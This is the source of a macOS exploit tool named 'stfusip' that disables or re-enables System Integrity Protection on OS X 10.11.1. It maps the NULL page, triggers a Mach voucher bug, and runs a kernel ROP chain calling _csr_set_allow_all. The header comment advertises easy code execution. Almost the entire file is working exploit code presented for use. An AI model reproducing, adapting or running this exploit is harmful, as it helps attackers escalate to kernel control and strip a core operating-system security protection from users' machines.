/*
*           stfusip -- System Integrity Protection bypass for 10.11.1
*                                     ***
*  - usage: ./stfusip [enable]/[disable]
*  - special thanks to: @qwertyoruiop, for bug and related help!
*  - bug was already public and possibly killed in 10.10.2. provides ez code execution!
*  - enjoy while it lasts!
*/

#import <Foundation/Foundation.h>

#include <stdio.h>
#include <stdlib.h>
#include <mach/mach_vm.h>
#include <mach/mach_voucher.h>
#include <sys/syscall.h>
#include <unistd.h>
#include <fcntl.h>

#include "ropnroll/ropnroll.h"
#include "ropnroll/ropnroll_macros.h"
#include "ropnroll/gadgets/rnr_gadgets.h"

#define KAS_INFO_KERNEL_TEXT_SLIDE_SELECTOR (0)
#define KAS_INFO_MAX_SELECTOR (1)

#define KERNEL_PATH "/System/Library/Kernels/kernel"

extern uint64_t kslide;

uint16_t alloc_null(vm_size_t size)
{
    kern_return_t kr;
    mach_vm_address_t null_map=0x0;
    vm_deallocate(mach_task_self(), 0x0, 0x1000);
    kr=mach_vm_allocate(mach_task_self(), &null_map, 0x1000, 0);
    if (kr != KERN_SUCCESS)
        return 1;

    return 0;
}

static kern_return_t _voucher_create_mach_voucher(const mach_voucher_attr_recipe_data_t *recipes, size_t recipes_size, mach_voucher_t *kvp)
{
    kern_return_t kr;
    mach_port_t mhp = mach_host_self();
    mach_voucher_t kv = MACH_VOUCHER_NULL;
    mach_voucher_attr_raw_recipe_array_t kvr;
    mach_voucher_attr_recipe_size_t kvr_size;
    kvr = (mach_voucher_attr_raw_recipe_array_t)recipes;
    kvr_size = (mach_voucher_attr_recipe_size_t)recipes_size;
    kr = host_create_mach_voucher(mhp, kvr, kvr_size, &kv);
    *kvp = kv;

    return kr;
}

int main(int argc, char **argv)
{
  if (getuid() != 0) {
    fprintf(stderr, "[!] run me as root!\n");
    return 1;
  }

  if (argc<2) {
    fprintf(stderr, "[!] usage: ./exec [enable]/[disable]\n");
    return 2;
  }

  mach_voucher_t kv;
  mach_voucher_attr_recipe_data_t task_create_recipe = {
    .key = MACH_VOUCHER_ATTR_KEY_BANK,
    .command = 610,
    .content_size = 0
  };

  _voucher_create_mach_voucher(&task_create_recipe, sizeof(mach_voucher_attr_recipe_data_t), &kv);

  uint64_t status=0;
  if (strcmp(argv[1], "enable") == 0) {
    status=0;
  } else if (strcmp(argv[1], "disable") == 0) {
    status=1;
  } else {
    fprintf(stderr, "[!] usage: ./exec [enable]/[disable]\n");
    return 3;
  }

  gadget_map_t *map=rnr_map_file_with_path(KERNEL_PATH);
  if (!map->map) {
    fprintf(stderr, "[!] unable to map kernel!\n");
    return 4;
  }

  RNR_SET_SLIDE(rnr_get_kslide());
  printf("[+] kaslr slide is: %#016llx\n", kslide);

  alloc_null(0x1000);

  volatile uint64_t *trigger=(uint64_t*)0x18, *pivot=(uint64_t*)0x261;

  uint64_t fake_stack[16];
  bzero(fake_stack, 16);

  fake_stack[0] = RNR_POP_RDI(map);
  fake_stack[1] = status;
  fake_stack[2] = RNR_SLIDE_POINTER(rnr_locate_symbol_in_map(map, "_csr_set_allow_all"));
  fake_stack[3] = RNR_SLIDE_POINTER(rnr_locate_symbol_in_map(map, "_thread_exception_return"));

  printf("[+] built ROP chain @ %p (mapped @ %p)!\n", fake_stack, pivot);

  *trigger = RNR_XCHG_ESP_EAX(map); //execute pivot
  printf("[+] trigger set: %p : %#llx\n", trigger, (uint64_t)*trigger);

  pivot[0] = RNR_POP_RSP(map);
  pivot[1] = (uint64_t)fake_stack;

  mach_voucher_attr_command(kv, 610, 0, 0, 0, 0, 0);

  printf("\n");

  if (status==0) {
    open("/System/test", O_CREAT);
    if(access("/System/test", F_OK) == -1) {
      printf("[+] System Integrity Protection (SIP) has been enabled.\n");
    } else {
      printf("[!] System Integrity Protection (SIP) couldn't be enabled!\n");
      return 5;
    }
  } else {
    open("/System/test", O_CREAT);
    if(access("/System/test", F_OK) != -1) {
      printf("[-] System Integrity Protection (SIP) has been disabled.\n");
      unlink("/System/test");
    } else {
      printf("[!] System Integrity Protection (SIP) couldn't be disabled!\n");
      return 6;
    }
  }
  return 0;
}
